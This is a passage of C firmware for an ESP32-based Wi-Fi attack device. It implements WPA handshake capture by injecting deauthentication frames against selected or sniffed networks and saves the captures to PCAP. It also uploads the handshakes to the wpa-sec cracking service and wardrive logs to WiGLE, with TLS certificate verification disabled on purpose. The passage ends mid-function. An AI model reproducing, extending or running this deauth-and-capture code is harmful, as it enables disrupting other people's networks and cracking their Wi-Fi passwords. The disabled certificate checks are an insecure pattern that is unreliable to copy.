                    // Tab5 parses: strstr("Handshake #") && strstr("captured")
                    MY_LOG_INFO(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
                               total_handshakes_captured, hs_ap_count, hs_client_count);
                    {
                        char hss_l2[64], hss_l4[64];
                        snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
                        snprintf(hss_l4, sizeof(hss_l4), "  >> Saved! #%d", total_handshakes_captured);
                        oled_display_update_full("> WPA Sniffer", hss_l2, "  Handshake OK!", hss_l4);
                    }
                    
                    // Re-init PCAP after save to free memory and start fresh
                    pcap_serializer_init();
                    // Re-capture beacons for remaining APs
                    for (int j = 0; j < hs_ap_count; j++) {
                        if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
                            hs_ap_targets[j].beacon_captured = false; // Will be re-captured
                        }
                    }
                } else {
                    // Tab5 parses: strstr("No handshake for")
                    MY_LOG_INFO(TAG, "No handshake for '%s' - save failed", ap->ssid);
                }
            }
        }
        
        // Periodic stats
        if ((now - last_stats_time) >= HS_STATS_INTERVAL_US) {
            int wpa_aps = 0, completed = 0, skipped = 0;
            for (int i = 0; i < hs_ap_count; i++) {
                if (hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) wpa_aps++;
                if (hs_ap_targets[i].complete) completed++;
                if (hs_ap_targets[i].has_existing_file) skipped++;
            }
            
            // Find top D-UCB channel
            int top_ch = 0;
            int top_pulls = 0;
            for (int i = 0; i < ducb_channel_count; i++) {
                if (ducb_channels[i].total_pulls > top_pulls) {
                    top_pulls = ducb_channels[i].total_pulls;
                    top_ch = ducb_channels[i].channel;
                }
            }
            
            // Tab5 parses: strstr("Attacking") && strstr("networks...")
            MY_LOG_INFO(TAG, "Attacking %d networks... (WPA: %d, Clients: %d)", 
                       wpa_aps, wpa_aps, hs_client_count);
            // Tab5 parses: strstr("Networks attacked this cycle:") -> count after "cycle:"
            MY_LOG_INFO(TAG, "Networks attacked this cycle: %d", wpa_aps - skipped);
            // Tab5 parses: strstr("Handshakes captured so far:") -> count after "so far:"
            MY_LOG_INFO(TAG, "Handshakes captured so far: %d", completed);
            MY_LOG_INFO(TAG, "D-UCB best channel: %d (%d visits), current: Ch %d",
                       top_ch, top_pulls, channel);
            
            last_stats_time = now;
        }
    }
    
    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);
    
    // Tab5 parses: strstr("Attack Cycle Complete")
    MY_LOG_INFO(TAG, "===== Attack Cycle Complete =====");
    MY_LOG_INFO(TAG, "Total handshakes captured: %d", total_handshakes_captured);
    MY_LOG_INFO(TAG, "Sniffer mode stopped.");
}

// Handshake attack task - dispatches to selected or sniffer mode
static void handshake_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Handshake attack task started.");
    MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks" : "Sniffer + D-UCB");
    
    // Set LED to cyan for handshake attack
    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for handshake attack: %s", esp_err_to_name(led_err));
    }
    
    if (handshake_selected_mode) {
        handshake_attack_task_selected();
    } else {
        handshake_attack_task_sniffer();
    }
    
    // Cleanup
    handshake_cleanup();
    
    MY_LOG_INFO(TAG, "Handshake attack task finished.");
    vTaskDelete(NULL);
}

static int cmd_start_deauth(int argc, char **argv) {
    {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        char oled_ch[32];
        oled_build_channel_info(oled_ch, sizeof(oled_ch));
        oled_display_update_full("> Deauth Attack", oled_target, oled_ch, "  Active...");
    }
    onlyDeauth = 1;
    return cmd_start_evil_twin(argc, argv);
}

static int cmd_start_handshake(int argc, char **argv) {
    {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        char oled_ch[32];
        oled_build_channel_info(oled_ch, sizeof(oled_ch));
        oled_display_update_full("> WPA Capture", oled_target, "  Deauth+Capture", "  Hunting...");
    }
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Enable AP mode for raw frame injection (deauth packets)
    if (!ensure_ap_mode()) {
        MY_LOG_INFO(TAG, "Failed to enable AP mode for deauth injection");
        return 1;
    }
    
    // Check if handshake attack is already running
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Handshake attack already running. Use 'stop' to stop it first.");
        return 1;
    }

    // Optional: allow passing indexes directly (like "start_handshake 13 14")
    if (argc > 1) {
        // If a scan is still running, wait briefly for completion
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before starting handshake...");
            int wait_loops = 0;
            while (g_scan_in_progress && wait_loops < 100) { // ~10s max
                vTaskDelay(pdMS_TO_TICKS(100));
                wait_loops++;
            }
        }

        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results yet. Run scan_networks first.");
            return 1;
        }

        // Build selection from provided indexes (1-based like UI)
        g_selected_count = 0;
        for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
            int idx = atoi(argv[i]) - 1;
            if (idx < 0 || idx >= (int)g_scan_count) {
                ESP_LOGW(TAG,"Index %d out of bounds (1..%u)", idx + 1, g_scan_count);
                continue;
            }
            g_selected_indices[g_selected_count++] = idx;
        }

        if (g_selected_count == 0) {
            MY_LOG_INFO(TAG, "No valid targets from arguments. Aborting handshake.");
            return 1;
        }
    }
    
    // Reset stop flag
    operation_stop_requested = false;
    
    // Initialize state
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
    memset(handshake_captured, 0, sizeof(handshake_captured));
    
    // Check if networks were selected
    if (g_selected_count > 0) {
        // Selected networks mode
        handshake_selected_mode = true;
        handshake_target_count = g_selected_count;
        
        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Selected Networks Mode");
        MY_LOG_INFO(TAG, "Targets: %d network(s)", g_selected_count);
        
        // Copy selected networks to handshake targets
        for (int i = 0; i < g_selected_count; i++) {
            int idx = g_selected_indices[i];
            memcpy(&handshake_targets[i], &g_scan_results[idx], sizeof(wifi_ap_record_t));
            MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d", 
                       i + 1, (const char*)handshake_targets[i].ssid, handshake_targets[i].primary);
        }
        
        MY_LOG_INFO(TAG, "Will spend max 40s on each network");
        MY_LOG_INFO(TAG, "Will stop automatically when all networks captured");
    } else {
        // Sniffer + D-UCB mode (replaces old scan-all)
        handshake_selected_mode = false;
        
        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Sniffer + D-UCB Mode");
        MY_LOG_INFO(TAG, "No networks selected - promiscuous sniffer with D-UCB channel selection");
        MY_LOG_INFO(TAG, "Will discover APs/clients from traffic and send targeted deauth");
        MY_LOG_INFO(TAG, "Will run until 'stop' command");
        MY_LOG_INFO(TAG, "Existing handshakes in /sdcard/lab/handshakes/ will be skipped");
    }
    
    MY_LOG_INFO(TAG, "Method: %s", handshake_selected_mode 
                ? "Broadcast deauth + passive capture" 
                : "Sniffer + D-UCB + targeted deauth");
    MY_LOG_INFO(TAG, "Handshakes will be saved automatically to SD card");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack");
    
    // Start handshake attack task
    handshake_attack_active = true;
    BaseType_t result = xTaskCreate(
        handshake_attack_task,
        "handshake_attack",
        12288, // Stack size (larger for sniffer mode PCAP/HCCAPX operations)
        NULL,
        5,     // Priority
        &handshake_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create handshake attack task!");
        handshake_attack_active = false;
        return 1;
    }
    
    return 0;
}

static int cmd_save_handshake(int argc, char **argv) {
    oled_display_update_full("> Save Capture", "  Writing PCAP", "  /lab/handshakes", "  SD Card...");
    // Avoid compiler warnings
    (void)argc; (void)argv;
    
    MY_LOG_INFO(TAG, "Manually saving handshake to SD card...");
    
    if (attack_handshake_save_to_sd()) {
        MY_LOG_INFO(TAG, "✓ Handshake saved successfully!");
        MY_LOG_INFO(TAG, "Files saved to: /sdcard/lab/handshakes/");
        return 0;
    } else {
        MY_LOG_INFO(TAG, "✗ Failed to save - no complete 4-way handshake captured");
        MY_LOG_INFO(TAG, "Make sure you captured all 4 messages of the handshake");
        return 1;
    }
}

// --------------- WPA-SEC commands ---------------

static bool wigle_split_key_pair(const char *input,
                                 char *api_name,
                                 size_t api_name_sz,
                                 char *api_token,
                                 size_t api_token_sz) {
    if (!input || !api_name || !api_token || api_name_sz == 0 || api_token_sz == 0) {
        return false;
    }

    const char *start = input;
    while (*start && isspace((unsigned char)*start)) {
        start++;
    }

    const char *sep = strchr(start, ':');
    if (!sep || sep == start) {
        return false;
    }

    const char *name_end = sep;
    while (name_end > start && isspace((unsigned char)*(name_end - 1))) {
        name_end--;
    }

    const char *token_start = sep + 1;
    while (*token_start && isspace((unsigned char)*token_start)) {
        token_start++;
    }

    const char *token_end = token_start + strlen(token_start);
    while (token_end > token_start && isspace((unsigned char)*(token_end - 1))) {
        token_end--;
    }

    size_t name_len = (size_t)(name_end - start);
    size_t token_len = (size_t)(token_end - token_start);
    if (name_len == 0 || token_len == 0) {
        return false;
    }
    if (name_len >= api_name_sz || token_len >= api_token_sz) {
        return false;
    }

    memcpy(api_name, start, name_len);
    api_name[name_len] = '\0';
    memcpy(api_token, token_start, token_len);
    api_token[token_len] = '\0';
    return true;
}

static bool wigle_is_upload_candidate(const char *filename) {
    if (!filename) {
        return false;
    }
    size_t len = strlen(filename);
    if (len > 4 && strcasecmp(filename + len - 4, ".log") == 0) {
        return true;
    }
    if (len > 4 && strcasecmp(filename + len - 4, ".txt") == 0) {
        return true;
    }
    if (len > 4 && strcasecmp(filename + len - 4, ".csv") == 0) {
        return true;
    }
    return false;
}

static bool wdgwars_is_upload_candidate(const char *filename) {
    if (!filename) {
        return false;
    }
    size_t len = strlen(filename);
    if (len > 4 && strcasecmp(filename + len - 4, ".log") == 0) {
        return true;
    }
    if (len > 4 && strcasecmp(filename + len - 4, ".csv") == 0) {
        return true;
    }
    return false;
}

static const char *wigle_basename(const char *path) {
    if (!path) {
        return NULL;
    }
    const char *base = path;
    const char *slash = strrchr(path, '/');
    const char *bslash = strrchr(path, '\\');
    if (slash && bslash) {
        base = (slash > bslash) ? (slash + 1) : (bslash + 1);
    } else if (slash) {
        base = slash + 1;
    } else if (bslash) {
        base = bslash + 1;
    }
    return base;
}

static bool wigle_resolve_upload_target(const char *arg, char *out_path, size_t out_path_sz, char *out_name, size_t out_name_sz) {
    if (!arg || !out_path || !out_name || out_path_sz == 0 || out_name_sz == 0) {
        return false;
    }

    const char *name = wigle_basename(arg);
    if (!name || name[0] == '\0' || !wigle_is_upload_candidate(name)) {
        return false;
    }

    if (strchr(arg, '/') || strchr(arg, '\\')) {
        if (strncmp(arg, "/sdcard/", 8) == 0) {
            snprintf(out_path, out_path_sz, "%s", arg);
        } else if (strncmp(arg, "sdcard/", 7) == 0) {
            snprintf(out_path, out_path_sz, "/%s", arg);
        } else {
            return false;
        }
    } else {
        snprintf(out_path, out_path_sz, "/sdcard/lab/wardrives/%s", name);
    }

    snprintf(out_name, out_name_sz, "%s", name);

    struct stat st;
    if (stat(out_path, &st) != 0 || !S_ISREG(st.st_mode)) {
        return false;
    }
    return true;
}

static bool wdgwars_resolve_upload_target(const char *arg, char *out_path, size_t out_path_sz, char *out_name, size_t out_name_sz) {
    if (!arg || !out_path || !out_name || out_path_sz == 0 || out_name_sz == 0) {
        return false;
    }

    const char *name = wigle_basename(arg);
    if (!name || name[0] == '\0' || !wdgwars_is_upload_candidate(name)) {
        return false;
    }

    if (strchr(arg, '/') || strchr(arg, '\\')) {
        if (strncmp(arg, "/sdcard/", 8) == 0) {
            snprintf(out_path, out_path_sz, "%s", arg);
        } else if (strncmp(arg, "sdcard/", 7) == 0) {
            snprintf(out_path, out_path_sz, "/%s", arg);
        } else {
            return false;
        }
    } else {
        snprintf(out_path, out_path_sz, "/sdcard/lab/wardrives/%s", name);
    }

    snprintf(out_name, out_name_sz, "%s", name);

    struct stat st;
    if (stat(out_path, &st) != 0 || !S_ISREG(st.st_mode)) {
        return false;
    }
    return true;
}

static int cmd_wpasec_key(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: wpasec_key set <key> | wpasec_key read");
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (wpasec_api_key[0] == '\0') {
            MY_LOG_INFO(TAG, "WPA-SEC key: not set");
            MY_LOG_INFO(TAG, "Get your key at: https://wpa-sec.stanev.org/?get_key");
        } else {
            // Show first 4 chars, mask the rest
            MY_LOG_INFO(TAG, "WPA-SEC key: %.4s****", wpasec_api_key);
        }
        return 0;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: wpasec_key set <key>");
            MY_LOG_INFO(TAG, "Get your key at: https://wpa-sec.stanev.org/?get_key");
            return 0;
        }
        const char *key = argv[2];
        if (strlen(key) == 0 || strlen(key) >= WPASEC_KEY_MAX_LEN) {
            MY_LOG_INFO(TAG, "Invalid key length (max %d chars)", WPASEC_KEY_MAX_LEN - 1);
            return 1;
        }
        if (wpasec_save_key_to_nvs(key)) {
            strncpy(wpasec_api_key, key, sizeof(wpasec_api_key) - 1);
            wpasec_api_key[sizeof(wpasec_api_key) - 1] = '\0';
            MY_LOG_INFO(TAG, "WPA-SEC key saved: %.4s****", wpasec_api_key);
        } else {
            MY_LOG_INFO(TAG, "Failed to save WPA-SEC key to NVS");
            return 1;
        }
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: wpasec_key set <key> | wpasec_key read");
    return 0;
}

/**
 * @brief Write all data to esp_tls, handling partial writes
 */
static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len) {
    int written = 0;
    while (written < len) {
        int ret = esp_tls_conn_write(tls, buf + written, len - written);
        if (ret < 0) {
            return ret;
        }
        written += ret;
    }
    return written;
}

/**
 * @brief Upload a single .pcap file to wpa-sec.stanev.org
 *
 * Uses esp_tls directly (not esp_http_client) for full control over
 * TLS settings, specifically to skip server certificate verification.
 *
 * @param filepath  Full path to .pcap file on SD card
 * @param filename  Just the filename (for the Content-Disposition header)
 * @return 0 on success, 1 on duplicate ("already submitted"), -1 on error
 */
static int wpasec_upload_file(const char *filepath, const char *filename) {
    // Read file into memory
    FILE *f = fopen(filepath, "rb");
    if (!f) {
        MY_LOG_INFO(TAG, "  Failed to open: %s", filepath);
        return -1;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size <= 0 || file_size > 512 * 1024) {
        MY_LOG_INFO(TAG, "  Invalid file size: %ld bytes", file_size);
        fclose(f);
        return -1;
    }

    // Prefer PSRAM for file buffer
    uint8_t *file_buf = NULL;
    if (heap_caps_get_free_size(MALLOC_CAP_SPIRAM) > (size_t)file_size + 1024) {
        file_buf = (uint8_t *)heap_caps_malloc((size_t)file_size, MALLOC_CAP_SPIRAM);
    }
    if (!file_buf) {
        file_buf = (uint8_t *)malloc((size_t)file_size);
    }
    if (!file_buf) {
        MY_LOG_INFO(TAG, "  Memory allocation failed (%ld bytes)", file_size);
        fclose(f);
        return -1;
    }

    size_t bytes_read = fread(file_buf, 1, (size_t)file_size, f);
    fclose(f);

    if (bytes_read != (size_t)file_size) {
        MY_LOG_INFO(TAG, "  Read error: got %zu of %ld bytes", bytes_read, file_size);
        free(file_buf);
        return -1;
    }

    // Build multipart body parts
    char boundary[32];
    snprintf(boundary, sizeof(boundary), "----WpaSec%lu", (unsigned long)(esp_timer_get_time() / 1000));

    char body_start[256];
    int start_len = snprintf(body_start, sizeof(body_start),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, filename);

    char body_end[48];
    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);

    int body_total_len = start_len + (int)file_size + end_len;

    // Build HTTP request headers
    char http_headers[512];
    int hdr_len = snprintf(http_headers, sizeof(http_headers),
        "POST / HTTP/1.1\r\n"
        "Host: wpa-sec.stanev.org\r\n"
        "Cookie: key=%s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "User-Agent: projectZero-wpasec\r\n"
        "Connection: close\r\n"
        "\r\n",
        wpasec_api_key, boundary, body_total_len);

    // Open TLS connection - skip server cert verification (insecure, like reference code)
    esp_tls_cfg_t tls_cfg = {
        .crt_bundle_attach = NULL,  // Skip certificate verification in ESP-IDF v6.0
        .timeout_ms = 15000,
    };

    esp_tls_t *tls = esp_tls_init();
    if (!tls) {
        MY_LOG_INFO(TAG, "  TLS init failed");
        free(file_buf);
        return -1;
    }

    int ret = esp_tls_conn_http_new_sync(WPASEC_URL, &tls_cfg, tls);
    if (ret < 0) {
        MY_LOG_INFO(TAG, "  TLS connection failed");
        esp_tls_conn_destroy(tls);
        free(file_buf);
        return -1;
    }

    // Send HTTP headers
    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0) {
        MY_LOG_INFO(TAG, "  Failed to send HTTP headers");
        esp_tls_conn_destroy(tls);
        free(file_buf);
        return -1;
    }

    // Send multipart body: start boundary + file data + end boundary
    int write_ok = 1;
    if (wpasec_tls_write_all(tls, body_start, start_len) < 0) write_ok = 0;
    if (write_ok && wpasec_tls_write_all(tls, (const char *)file_buf, (int)file_size) < 0) write_ok = 0;
    if (write_ok && wpasec_tls_write_all(tls, body_end, end_len) < 0) write_ok = 0;
    free(file_buf);

    if (!write_ok) {
        MY_LOG_INFO(TAG, "  Failed to send body");
        esp_tls_conn_destroy(tls);
        return -1;
    }

    // Read response
    char resp_buf[512] = {0};
    int total_read = 0;
    while (total_read < (int)sizeof(resp_buf) - 1) {
        ret = esp_tls_conn_read(tls, resp_buf + total_read, sizeof(resp_buf) - 1 - total_read);
        if (ret <= 0) break;
        total_read += ret;
    }
    resp_buf[total_read] = '\0';

    esp_tls_conn_destroy(tls);

    // Parse HTTP status code from response (e.g. "HTTP/1.1 200 OK")
    int status = 0;
    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
        const char *sp = strchr(resp_buf, ' ');
        if (sp) status = atoi(sp + 1);
    }

    if (status == 200) {
        if (strstr(resp_buf, "already submitted") != NULL) {
            return 1; // duplicate
        }
        return 0; // success
    } else {
        MY_LOG_INFO(TAG, "  HTTP error %d", status);
        return -1;
    }
}

static int cmd_wpasec_upload(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> WPA-sec", "  Sending PCAPs", "  wpa-sec.stanev", "  Uploading...");

    // 1. Check WiFi STA is connected
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return 1;
    }

    // 2. Check API key
    if (wpasec_api_key[0] == '\0') {
        MY_LOG_INFO(TAG, "No WPA-SEC API key set. Use 'wpasec_key set <key>' first.");
        MY_LOG_INFO(TAG, "Get your key at: https://wpa-sec.stanev.org/?get_key");
        return 1;
    }

    // 3. Init SD card and open handshakes directory
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    DIR *dir = opendir("/sdcard/lab/handshakes");
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/handshakes directory");
        return 1;
    }

    // Count .pcap files first
    struct dirent *entry;
    int total_files = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) continue;
        size_t nlen = strlen(entry->d_name);
        if (nlen > 5 && strcasecmp(entry->d_name + nlen - 5, ".pcap") == 0) {
            total_files++;
        }
    }

    if (total_files == 0) {
        MY_LOG_INFO(TAG, "No .pcap files found in /sdcard/lab/handshakes/");
        closedir(dir);
        return 0;
    }

    MY_LOG_INFO(TAG, "Uploading %d handshake(s) to wpa-sec.stanev.org...", total_files);

    // Rewind and process
    rewinddir(dir);
    int current = 0;
    int uploaded = 0;
    int duplicates = 0;
    int failed = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) continue;
        size_t nlen = strlen(entry->d_name);
        if (nlen <= 5 || strcasecmp(entry->d_name + nlen - 5, ".pcap") != 0) continue;

        current++;
        char filepath[280];
        snprintf(filepath, sizeof(filepath), "/sdcard/lab/handshakes/%s", entry->d_name);

        // Get file size for display
        struct stat st;
        long fsize = 0;
        if (stat(filepath, &st) == 0) {
            fsize = (long)st.st_size;
        }

        int result = wpasec_upload_file(filepath, entry->d_name);

        if (result == 0) {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", current, total_files, entry->d_name, fsize);
            uploaded++;
        } else if (result == 1) {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> already submitted", current, total_files, entry->d_name, fsize);
            duplicates++;
        } else {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", current, total_files, entry->d_name, fsize);
            failed++;
        }

        // Small delay between uploads to let WiFi stack settle
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    closedir(dir);

    MY_LOG_INFO(TAG, "Done: %d uploaded, %d duplicate, %d failed", uploaded, duplicates, failed);
    return (failed > 0) ? 1 : 0;
}

/**
 * @brief Upload a single Wardrive file (.log/.txt/.csv) to api.wigle.net
 *
 * @return 0 on success, 1 on duplicate/skipped, 2 on auth error, -1 on error
 */
static int wigle_upload_file(const char *filepath, const char *filename) {
    const size_t CHUNK_SIZE = 2048;
    const size_t HDR_BUF_SZ = 640;
    const size_t RESP_BUF_SZ = 640;
    int result = -1;
    FILE *f = NULL;
    esp_tls_t *tls = NULL;
    uint8_t *chunk_buf = NULL;
    char *http_headers = NULL;
    char *resp_buf = NULL;

    f = fopen(filepath, "rb");
    if (!f) {
        MY_LOG_INFO(TAG, "  Failed to open: %s", filepath);
        goto cleanup;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (file_size <= 0 || file_size > 16L * 1024L * 1024L) {
        MY_LOG_INFO(TAG, "  Invalid file size: %ld bytes", file_size);
        goto cleanup;
    }

    char auth_plain[2 * WIGLE_KEY_MAX_LEN + 2];
    int auth_plain_len = snprintf(auth_plain, sizeof(auth_plain), "%s:%s", wigle_api_name, wigle_api_token);
    if (auth_plain_len <= 0 || auth_plain_len >= (int)sizeof(auth_plain)) {
        MY_LOG_INFO(TAG, "  WiGLE credentials are too long");
        goto cleanup;
    }

    unsigned char auth_b64[220];
    size_t auth_b64_len = 0;
    int b64_ret = mbedtls_base64_encode(auth_b64, sizeof(auth_b64) - 1, &auth_b64_len,
                                        (const unsigned char *)auth_plain, (size_t)auth_plain_len);
    if (b64_ret != 0 || auth_b64_len == 0 || auth_b64_len >= sizeof(auth_b64)) {
        MY_LOG_INFO(TAG, "  Failed to build WiGLE auth header");
        goto cleanup;
    }
    auth_b64[auth_b64_len] = '\0';

    char boundary[40];
    snprintf(boundary, sizeof(boundary), "----WiGLE%lu", (unsigned long)(esp_timer_get_time() / 1000));

    char body_start[256];
    int start_len = snprintf(body_start, sizeof(body_start),
                             "--%s\r\n"
                             "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                             "Content-Type: text/csv\r\n\r\n",
                             boundary, filename);
    if (start_len <= 0 || start_len >= (int)sizeof(body_start)) {
        MY_LOG_INFO(TAG, "  Failed to build multipart header");
        goto cleanup;
    }

    char body_end[64];
    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);
    if (end_len <= 0 || end_len >= (int)sizeof(body_end)) {
        MY_LOG_INFO(TAG, "  Failed to build multipart footer");
        goto cleanup;
    }

    int64_t body_total_len_64 = (int64_t)start_len + (int64_t)file_size + (int64_t)end_len;
    if (body_total_len_64 <= 0 || body_total_len_64 > INT_MAX) {
        MY_LOG_INFO(TAG, "  File too large for HTTP content-length: %ld bytes", file_size);
        goto cleanup;
    }
    int body_total_len = (int)body_total_len_64;

    http_headers = (char *)heap_caps_malloc(HDR_BUF_SZ, MALLOC_CAP_8BIT);
    resp_buf = (char *)heap_caps_malloc(RESP_BUF_SZ, MALLOC_CAP_8BIT);
    chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!chunk_buf) {
        chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_8BIT);
    }
    if (!http_headers || !resp_buf || !chunk_buf) {
        MY_LOG_INFO(TAG, "  Buffer allocation failed (hdr/resp/chunk)");
        goto cleanup;
    }

    int hdr_len = snprintf(http_headers, HDR_BUF_SZ,
                           "POST /api/v2/file/upload HTTP/1.1\r\n"
                           "Host: api.wigle.net\r\n"
                           "Authorization: Basic %s\r\n"
                           "Content-Type: multipart/form-data; boundary=%s\r\n"
                           "Content-Length: %d\r\n"
                           "User-Agent: projectZero-wigle\r\n"
                           "Connection: close\r\n"
                           "\r\n",
                           (const char *)auth_b64, boundary, body_total_len);
    if (hdr_len <= 0 || hdr_len >= (int)HDR_BUF_SZ) {
        MY_LOG_INFO(TAG, "  Failed to build HTTP headers");
        goto cleanup;
    }

    esp_tls_cfg_t tls_cfg = {
        .crt_bundle_attach = NULL,
        .timeout_ms = 20000,
    };

    tls = esp_tls_init();
    if (!tls) {
        MY_LOG_INFO(TAG, "  TLS init failed");
        goto cleanup;
    }

    int ret = esp_tls_conn_http_new_sync(WIGLE_URL, &tls_cfg, tls);
    if (ret < 0) {
        MY_LOG_INFO(TAG, "  TLS connection failed");
        goto cleanup;
    }

    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0 ||
        wpasec_tls_write_all(tls, body_start, start_len) < 0) {
        MY_LOG_INFO(TAG, "  Failed to send request headers/body start");
        goto cleanup;
    }

    while (1) {
        size_t bytes_read = fread(chunk_buf, 1, CHUNK_SIZE, f);
        if (bytes_read > 0) {
            if (wpasec_tls_write_all(tls, (const char *)chunk_buf, (int)bytes_read) < 0) {
                MY_LOG_INFO(TAG, "  Failed to send file chunk");
                goto cleanup;
            }
        }
        if (bytes_read < CHUNK_SIZE) {
            if (ferror(f)) {
                MY_LOG_INFO(TAG, "  Read error while streaming file");
                goto cleanup;
            }
            break;
        }
    }

    if (wpasec_tls_write_all(tls, body_end, end_len) < 0) {
        MY_LOG_INFO(TAG, "  Failed to send multipart footer");
        goto cleanup;
    }

    memset(resp_buf, 0, RESP_BUF_SZ);
    int total_read = 0;
    while (total_read < (int)RESP_BUF_SZ - 1) {
        ret = esp_tls_conn_read(tls, resp_buf + total_read, RESP_BUF_SZ - 1 - total_read);
        if (ret <= 0) break;
        total_read += ret;
    }
    resp_buf[total_read] = '\0';

    int status = 0;
    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
        const char *sp = strchr(resp_buf, ' ');
        if (sp) {
            status = atoi(sp + 1);
        }
    }

    bool duplicate = (strstr(resp_buf, "already") != NULL ||
                      strstr(resp_buf, "Already") != NULL ||
                      strstr(resp_buf, "duplicate") != NULL ||
                      strstr(resp_buf, "Duplicate") != NULL);
    bool success_false = (strstr(resp_buf, "\"success\":false") != NULL ||
                          strstr(resp_buf, "\"success\": false") != NULL);

    if (status == 200 || status == 201 || status == 202) {
        if (duplicate) {
            result = 1;
            goto cleanup;
        }
        if (success_false) {
            MY_LOG_INFO(TAG, "  WiGLE API returned success=false");
            result = -1;
            goto cleanup;
        }
        result = 0;
        goto cleanup;
    }

    if (status == 401 || status == 403) {
        result = 2;
        goto cleanup;
    }
    if (status == 409) {
        result = 1;
        goto cleanup;
    }

    MY_LOG_INFO(TAG, "  HTTP error %d", status);
    result = -1;

cleanup:
    if (f) {
        fclose(f);
    }
    if (tls) {
        esp_tls_conn_destroy(tls);
    }
    if (chunk_buf) {
        free(chunk_buf);
    }
    if (http_headers) {
        free(http_headers);
    }
    if (resp_buf) {
        free(resp_buf);
    }
    return result;
}

static int cmd_wigle_key(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token> | wigle_key set <api_name:api_token> | wigle_key read");
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (wigle_api_name[0] == '\0' || wigle_api_token[0] == '\0') {
            MY_LOG_INFO(TAG, "WiGLE key: not set");
            MY_LOG_INFO(TAG, "Set via: wigle_key set <api_name> <api_token>");
            MY_LOG_INFO(TAG, "Or place api_name:api_token in /sdcard/lab/wigle.txt and reboot.");
        } else {
            MY_LOG_INFO(TAG, "WiGLE key: %.4s****:%.4s****", wigle_api_name, wigle_api_token);
        }
        return 0;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        char api_name[WIGLE_KEY_MAX_LEN] = {0};
        char api_token[WIGLE_KEY_MAX_LEN] = {0};

        if (argc >= 4) {
            if (strlen(argv[2]) >= sizeof(api_name) || strlen(argv[3]) >= sizeof(api_token)) {
                MY_LOG_INFO(TAG, "Invalid key length (max %d chars each)", WIGLE_KEY_MAX_LEN - 1);
                return 1;
            }
            snprintf(api_name, sizeof(api_name), "%s", argv[2]);
            snprintf(api_token, sizeof(api_token), "%s", argv[3]);
        } else if (argc == 3) {
            if (!wigle_split_key_pair(argv[2], api_name, sizeof(api_name), api_token, sizeof(api_token))) {
